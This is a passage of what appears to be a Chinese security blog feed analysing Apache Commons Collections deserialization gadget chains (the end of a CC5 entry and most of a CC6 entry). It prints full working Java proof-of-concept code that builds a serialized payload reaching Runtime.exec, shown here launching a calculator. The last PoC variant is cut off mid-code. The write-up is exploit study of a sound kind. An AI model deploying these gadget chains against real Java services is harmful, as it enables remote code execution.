class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="number">666</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221011144759763.png" alt="image-20221011144759763"></p>]]></content>
    
    
    <summary type="html">CommonsCollections5利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections6利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections6/"/>
    <id>http://example.com/2022/11/10/CommonsCollections6/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:54:56.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections6利用链分析"><a href="#CommonsCollections6利用链分析" class="headerlink" title="CommonsCollections6利用链分析"></a>CommonsCollections6利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>为什么跳过了<code>CommonsCollections2</code>先学习<code>CommonsCollections6</code>？</strong></p><p>前面学习的<code>CommonsCollections</code>和<code>CommonsCollections1</code>链，可以看到都受限于 JDK 版本，在<code>jdk8u71</code>之后就无法利用，原因则是前面已经提过的。</p><p>而为了实现在高版本 JDK 的环境下依然能利用的问题，<code>CommonsCollections6</code>这条链子应运而生。因此在学完<code>CommonsCollections1</code>后接着学习<code>CommonsCollections6</code>会比较系统。</p><p>该条利用链的利用条件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先看一些 p 牛给出的简化利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>在 JDK 8u71 之后，<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject()</code>方法发生了变化导致无法再触发<code>LazyMap</code>类的<code>get()</code>方法，而思路自然而然就是再次寻找其他能触发<code>LazyMap#get()</code>的地方。在利用链中可以看到最后找到的是<code>TiedMapEntry</code>类</p><p>跟进查看<code>TiedMapEntry#hashCode()</code>方法源码，调用了<code>this.getValue();</code><br><img src="images/image-20221004215622854.png" alt="image-20221004215622854"></p><p>接着跟进<code>this.getValue()</code>方法<br><img src="images/image-20221004220012400.png" alt="image-20221004220012400"></p><p>可以看到在<code>getValue()</code>中调用了<code>map.get()</code>方法，并且<code>map</code>和<code>key</code>都是通过构造函数传入，完全可控，所以可以通过构造传参调用到<code>LazyMap#get()</code>，满足了我们的期望。</p><p>接下来就是寻找可以调用<code>TiedMapEntry#hashCode()</code>，在前面已经学习过的<a href="./02-反序列化专区/0-URLDNS利用链/URLDNS利用链.md">URLDNS利用链分析</a>章节中，我们已经知道在<code>HashMap#readObject()</code>里，<code>putVal()</code>方法对<code>key</code>进行了<code>hash()</code>计算，进而调用传进来的<code>key</code>的<code>hashCode()</code>的方法。</p><p>因此我们只要让<code>key</code>为<code>TiedMapEntry</code>对象，就可以完成整个攻击链。开始编写初始 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但运行后却没有弹出计算器，开始找找原因，我们在<code>LazyMap#get()</code>方法处打断点，结果发现一共调用了两次<code>LazyMap#get()</code></p><p>第一次时进入了 if 方法<br><img src="images/image-20221008152547485.png" alt="image-20221008152547485"></p><p>第二次时没有进入 if 方法<br><img src="images/image-20221008152629215.png" alt="image-20221008152629215"></p><p>为什么会调用两次<code>LazyMap#get()</code>方法呢？仔细再跟一遍才想起来<code>HashMap#put()</code>方法也会调用到<code>hashcode()</code><br><img src="images/image-20221008152723595.png" alt="image-20221008152723595"></p><p>因此在<code>expMap.put(tiedMapEntry,&quot;valueTest&quot;);</code>语句时就一次触发了一次<code>LazyMap#get()</code>利用链，但因为我们故意制造的<code>fakeTransformers</code>所以没有触发命令执行，但是却在这里将<code>keyTest</code>添加进了<code>outerMap</code>中。<br><img src="images/image-20221008153011697.png" alt="image-20221008153011697"></p><p>因此在经过反序列化后调用利用链时，再次进行 if 判断时，<code>keyTest</code>在<code>outermap</code>对象里，跳过了判断进入 else 语句，导致无法触发命令执行。</p><p>根据 p 牛的做法就是再写一句<code>outerMap.remove(&quot;keyTest&quot;);</code>将 key 从 <code>outerMap</code>中移除，因此最终 POC 为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221008153450633.png" alt="image-20221008153450633"></p><p>除了<code>outerMap.remove()</code>删除键值对，我们还可以通过替换 key 的方式进行处理。</p><p><code>HashMap</code>将键值对存储在了<code>Node&lt;K,V&gt;[] table</code>中，并封装在<code>Node</code>对象里，其中<code>Node</code>是<code>HashMap</code>内部的静态类<br><img src="images/image-20221008161018495.png" alt="image-20221008161018495"></p><p>因此我们首先需要通过反射获取到<code>table</code>字段，然后因为我们没有获取到<code>Node</code>类，所以之类需要转换为<code>Object</code>类型。最后取到数组中的 key 进行替换<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span 